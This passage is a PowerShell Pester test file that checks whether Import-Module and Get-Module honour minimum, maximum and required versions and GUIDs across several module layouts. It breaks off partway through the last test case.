


function New-ModuleSpecification
{
    param(
        $ModuleName,
        $ModuleVersion,
        $MaximumVersion,
        $RequiredVersion,
        $Guid)

    $modSpec = @{}

    if ($ModuleName)
    {
        $modSpec.ModuleName = $ModuleName
    }

    if ($ModuleVersion)
    {
        $modSpec.ModuleVersion = $ModuleVersion
    }

    if ($MaximumVersion)
    {
        $modSpec.MaximumVersion = $MaximumVersion
    }

    if ($RequiredVersion)
    {
        $modSpec.RequiredVersion = $RequiredVersion
    }

    if ($Guid)
    {
        $modSpec.Guid = $Guid
    }

    return $modSpec
}

function Invoke-ImportModule
{
    param(
        $Module,
        $MinimumVersion,
        $MaximumVersion,
        $RequiredVersion,
        [switch]$PassThru,
        [switch]$AsCustomObject)

    $cmdArgs =  @{
        Name = $Module
        ErrorAction = 'Stop'
    }

    if ($MinimumVersion)
    {
        $cmdArgs.MinimumVersion = $MinimumVersion
    }

    if ($MaximumVersion)
    {
        $cmdArgs.MaximumVersion = $MaximumVersion
    }

    if ($RequiredVersion)
    {
        $cmdArgs.RequiredVersion = $RequiredVersion
    }

    if ($PassThru)
    {
        $cmdArgs.PassThru = $true
    }

    if ($AsCustomObject)
    {
        $cmdArgs.AsCustomObject = $true
    }

    return Import-Module @cmdArgs
}

function Assert-ModuleIsCorrect
{
    param(
        $Module,
        [string]$Name = $moduleName,
        [guid]$Guid = $actualGuid,
        [version]$Version = $actualVersion,
        [version]$MinVersion,
        [version]$MaxVersion,
        [version]$RequiredVersion
    )

    $Module      | Should -Not -Be $null
    $Module.Name | Should -Be $ModuleName
    $Module.Guid | Should -Be $Guid
    if ($Version)
    {
        $Module.Version | Should -Be $Version
    }
    if ($ModuleVersion)
    {
        $Module.Version | Should -BeGreaterOrEqual $ModuleVersion
    }
    if ($MaximumVersion)
    {
        $Module.Version | Should -BeLessOrEqual $MaximumVersion
    }
    if ($RequiredVersion)
    {
        $Module.Version | Should -Be $RequiredVersion
    }
}

$actualVersion = '2.3'
$actualGuid = [guid]'9b945229-65fd-4629-ae99-88e2618377ff'

$successCases = @(
    @{
        ModuleVersion = '2.0'
        MaximumVersion = $null
        RequiredVersion = $null
    },
    @{
        ModuleVersion = '1.0'
        MaximumVersion = '3.0'
        RequiredVersion = $null
    },
    @{
        ModuleVersion = $null
        MaximumVersion = '3.0'
        RequiredVersion = $null
    },
    @{
        ModuleVersion = $null
        MaximumVersion = $null
        RequiredVersion = $actualVersion
    }
)

$failCases = @(
    @{
        ModuleVersion = '2.5'
        MaximumVersion = $null
        RequiredVersion = $null
    },
    @{
        ModuleVersion = '2.0'
        MaximumVersion = '2.2'
        RequiredVersion = $null
    },
    @{
        ModuleVersion = '3.0'
        MaximumVersion = '3.1'
        RequiredVersion = $null
    },
    @{
        ModuleVersion = '3.0'
        MaximumVersion = '2.0'
        RequiredVersion = $null
    },
    @{
        ModuleVersion = $null
        MaximumVersion = '1.7'
        RequiredVersion = $null
    },
    @{
        ModuleVersion = $null
        MaximumVersion = $null
        RequiredVersion = '2.2'
    }
)

$guidSuccessCases = [System.Collections.ArrayList]::new()
foreach ($case in $successCases)
{
    [void]$guidSuccessCases.Add($case + @{ Guid = $null })
    [void]$guidSuccessCases.Add(($case + @{ Guid = $actualGuid }))
}

$guidFailCases = [System.Collections.ArrayList]::new()
foreach ($case in $failCases)
{
    [void]$guidFailCases.Add($case + @{ Guid = $null })
    [void]$guidFailCases.Add($case + @{ Guid = $actualGuid })
    [void]$guidFailCases.Add($case + @{ Guid = [guid]::NewGuid() })
}

Describe "Module loading with version constraints" -Tags "Feature" {
    BeforeAll {
        $moduleName = 'TestModule'
        $modulePath = Join-Path $TestDrive $moduleName
        New-Item -Path $modulePath -ItemType Directory
        $manifestPath = Join-Path $modulePath "$moduleName.psd1"
        New-ModuleManifest -Path $manifestPath -ModuleVersion $actualVersion -Guid $actualGuid

        $oldPSModulePath = $env:PSModulePath
        $env:PSModulePath += [System.IO.Path]::PathSeparator + $TestDrive
    }

    AfterAll {
        $env:PSModulePath = $oldPSModulePath
    }

    AfterEach {
        Get-Module $moduleName | Remove-Module
    }

    It "Loads the module by FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Does not get the module when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Get-Module -FullyQualifiedName $modSpec

        $mod | Should -Be $null
    }

    It "Does not load the module with FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }
}

Describe "Versioned directory loading with module constraints" -Tags "Feature" {
    BeforeAll {
        $moduleName = 'TestModule'
        $modulePath = Join-Path $TestDrive $moduleName
        New-Item -Path $modulePath -ItemType Directory
        $versionPath = Join-Path $modulePath $actualVersion
        New-Item -Path $versionPath -ItemType Directory
        $manifestPath = Join-Path $versionPath "$moduleName.psd1"
        New-ModuleManifest -Path $manifestPath -ModuleVersion $actualVersion -Guid $actualGuid

        $oldPSModulePath = $env:PSModulePath
        $env:PSModulePath += [System.IO.Path]::PathSeparator + $TestDrive
    }

    AfterAll {
        $env:PSModulePath = $oldPSModulePath
    }

    AfterEach {
        Get-Module $moduleName | Remove-Module
    }

    It "Loads the module by FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Does not get the module when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Get-Module -FullyQualifiedName $modSpec

        $mod | Should -Be $null
    }

    It "Does not load the module with FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }
}

Describe "Rooted module loading with module constraints" -Tags "Feature" {
    BeforeAll {
        $moduleName = 'TestModule'
        $modulePath = Join-Path $TestDrive $moduleName
        New-Item -Path $modulePath -ItemType Directory
        $rootModuleName = 'RootModule.psm1'
        $rootModulePath = Join-Path $modulePath $rootModuleName
        New-Item -Path $rootModulePath -ItemType File -Value 'function Test-RootModule { 178 }'
        $manifestPath = Join-Path $modulePath "$moduleName.psd1"
        New-ModuleManifest -Path $manifestPath -ModuleVersion $actualVersion -Guid $actualGuid -RootModule $rootModuleName
        $oldPSModulePath = $env:PSModulePath
        $env:PSModulePath += [System.IO.Path]::PathSeparator + $TestDrive
    }

    AfterAll {
        $env:PSModulePath = $oldPSModulePath
    }

    AfterEach {
        Get-Module $moduleName | Remove-Module
    }

    It "Loads the module by FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module by FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidSuccessCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Import-Module -FullyQualifiedName $modSpec -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Loads the module with version constraints from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $successCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $mod = Invoke-ImportModule -Module $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid -PassThru

        Assert-ModuleIsCorrect `
            -Module $mod `
            -MinVersion $ModuleVersion `
            -MaxVersion $MaximumVersion `
            -RequiredVersion $RequiredVersion
    }

    It "Does not get the module when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        $mod = Get-Module -FullyQualifiedName $modSpec

        $mod | Should -Be $null
    }

    It "Does not load the module with FullyQualifiedName from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $modulePath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $moduleName -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with FullyQualifiedName from the manifest when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $guidFailCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $modSpec = New-ModuleSpecification -ModuleName $manifestPath -ModuleVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion -Guid $Guid

        { Import-Module -FullyQualifiedName $modSpec -ErrorAction Stop } | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from absolute path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
            Invoke-ImportModule -Module $modulePath -MinimumVersion $ModuleVersion -MaximumVersion $MaximumVersion -RequiredVersion $RequiredVersion
        }

        if ($ModuleVersion -and $MaximumVersion -and ($ModuleVersion -ge $MaximumVersion))
        {
            $sb | Should -Throw -ErrorId 'ArgumentOutOfRange,Microsoft.PowerShell.Commands.ImportModuleCommand'
            return
        }
        $sb | Should -Throw -ErrorId 'Modules_ModuleWithVersionNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand'
    }

    It "Does not load the module with version constraints from the module path when ModuleVersion=<ModuleVersion>, MaximumVersion=<MaximumVersion>, RequiredVersion=<RequiredVersion>, Guid=<Guid>" -TestCases $failCases {
        param($ModuleVersion, $MaximumVersion, $RequiredVersion, $Guid)

        $sb = {
